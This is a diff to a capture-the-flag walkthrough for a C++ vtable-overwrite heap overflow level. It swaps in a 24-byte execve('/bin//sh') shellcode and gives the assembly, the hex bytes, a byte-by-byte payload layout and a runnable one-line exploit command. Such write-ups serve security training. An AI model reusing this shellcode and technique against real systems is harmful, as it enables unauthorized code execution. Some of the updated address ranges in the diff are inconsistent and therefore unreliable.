@@ -254,43 +254,59 @@ When operator+ is called:
 
 ### Null-Free Shellcode
 
-Standard shellcode has null bytes, but we can use an alternative encoding:
+Standard shellcode has null bytes, but we use a verified null-byte-free shellcode from Exploit-DB:
+
+**Source:** [Exploit-DB #42428](https://www.exploit-db.com/shellcodes/42428)  
+**Author:** Touhid M.Shaikh  
+**Platform:** Linux/x86 (32-bit)  
+**Length:** 24 bytes  
 
 ```nasm
-; Null-free execve("/bin/sh") shellcode (40 bytes)
-; Uses JMP-CALL-POP technique to avoid null bytes
-\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c
-\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe1\xff\xff
-\xff\x2f\x62\x69\x6e\x2f\x73\x68
-
-; This shellcode:
-; - Has NO null bytes
-; - Executes /bin/sh via execve()
-; - Uses jmp-call-pop to get string address dynamically
-; - Is 40 bytes long
-; - Source: Standard null-free shellcode variant
+; execve("/bin//sh", NULL, NULL)
+xor eax,eax
+cdq
+push eax
+push 0x68732f2f
+push 0x6e69622f
+mov ebx,esp
+push eax
+push ebx
+mov ecx, esp
+mov al,0x0b
+int 0x80
 ```
+
+**Shellcode (hex):**
+```
+\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+```
+
+This shellcode:
+- Has NO null bytes
+- Executes `/bin/sh`
+- Is only 24 bytes long
+- Has been verified on Linux x86 systems
 
 ### The Attack Strategy
 
 **Payload Structure:**
 ```
-[20 NOPs] + [40-byte shellcode] + [48 NOPs] + [fake_vtable_ptr] + [shellcode_addr]
+[44 NOPs] + [24-byte shellcode] + [40 NOPs] + [fake_vtable_ptr] + [shellcode_addr]
    ↑            ↑                    ↑              ↑                   ↑
-  0-19        20-59               60-107         108-111            112-115
+  0-43        44-67               68-107         108-111            112-115
 ```
 
 **Detailed Breakdown:**
 
-1. **Bytes 0-19 (20 bytes):** NOP sled (`\x90` * 20)
+1. **Bytes 0-43 (44 bytes):** NOP sled (`\x90` * 44)
    - Creates landing zone for imprecise jumps
-   - Located at `0x804a00c` to `0x804a01f`
+   - Located at `0x804a00c` to `0x804a037`
 
-2. **Bytes 20-59 (40 bytes):** Null-free shellcode
-   - Starts at `0x804a020`
+2. **Bytes 44-67 (24 bytes):** Null-free shellcode
+   - Starts at `0x804a038`
    - Executes `/bin/sh`
 
-3. **Bytes 60-107 (48 bytes):** More NOPs (`\x90` * 48)
+3. **Bytes 68-107 (40 bytes):** More NOPs (`\x90` * 40)
    - Padding to reach obj2's vtable
    - Brings us to exactly 108 bytes
 
@@ -309,9 +325,9 @@ Standard shellcode has null bytes, but we can use an alternative encoding:
 Why `0x804a01c` and `0x804a07c`?
 
 ```
-Shellcode range:  0x804a00c - 0x804a03b
-NOP sled:         0x804a00c - 0x804a01f
-Target address:   0x804a01c ← Middle of NOP sled
+Shellcode range:  0x804a00c - 0x804a053
+NOP sled:         0x804a00c - 0x804a037
+Target address:   0x804a01c ← Middle of NOP sled (16 bytes in)
 
 Encoded: \x1c\xa0\x04\x08
 All bytes: 0x1c ✅, 0xa0 ✅, 0x04 ✅, 0x08 ✅
@@ -359,9 +375,9 @@ memcpy(0x804a00c, argv[1], 116);
   Length: 116 bytes
   
   Writes:
-    0x804a00c-0x804a01f: NOPs (20 bytes)
-    0x804a020-0x804a047: Shellcode (40 bytes)
-    0x804a048-0x804a077: NOPs (48 bytes)
+    0x804a00c-0x804a037: NOPs (44 bytes)
+    0x804a038-0x804a04f: Shellcode (24 bytes)
+    0x804a050-0x804a077: NOPs (40 bytes)
     0x804a078-0x804a07b: \x7c\xa0\x04\x08 ← OVERWRITES obj2->vtable!
     0x804a07c-0x804a07f: \x1c\xa0\x04\x08 ← Creates fake vtable entry
 
@@ -388,8 +404,8 @@ Step 5: Shellcode Execution
 CPU jumps to 0x0804a01c:
   Lands in NOP sled
   Slides down: NOP NOP NOP ...
-  Reaches shellcode at 0x0804a020
-  Executes: execve("/bin/sh", NULL, NULL)
+  Reaches shellcode at 0x0804a038
+  Executes: execve("/bin//sh", NULL, NULL)
 
 
 Step 6: Shell Spawned! 🎉
@@ -442,7 +458,7 @@ Level9 introduces **C++ OOP exploitation**:
 ## 💣 Execute the Exploit
 
 ```bash
-./level9 $(python -c 'print "\x90"*20 + "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "\x90"*48 + "\x7c\xa0\x04\x08" + "\x1c\xa0\x04\x08"')
+./level9 $(python -c 'print "\x90"*44 + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*40 + "\x7c\xa0\x04\x08" + "\x1c\xa0\x04\x08"')
 ```
 
 **Expected output:**
@@ -453,12 +469,14 @@ f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 
 **Payload breakdown:**
 ```
-\x90 * 20                  = NOP sled (20 bytes)
-\xeb\x1a...\x2f\x73\x68   = Null-free shellcode (40 bytes)
-\x90 * 48                  = Padding (48 bytes)
-\x7c\xa0\x04\x08          = Fake vtable pointer (4 bytes)
-\x1c\xa0\x04\x08          = Shellcode address (4 bytes)
+\x90 * 44                           = NOP sled (44 bytes)
+\x31\xc0\x99...\xb0\x0b\xcd\x80    = Null-free shellcode (24 bytes)
+\x90 * 40                           = Padding (40 bytes)
+\x7c\xa0\x04\x08                   = Fake vtable pointer (4 bytes)
+\x1c\xa0\x04\x08                   = Shellcode address (4 bytes)
 Total: 116 bytes
+
+Shellcode source: Exploit-DB #42428 by Touhid M.Shaikh
 ```
 
 ---
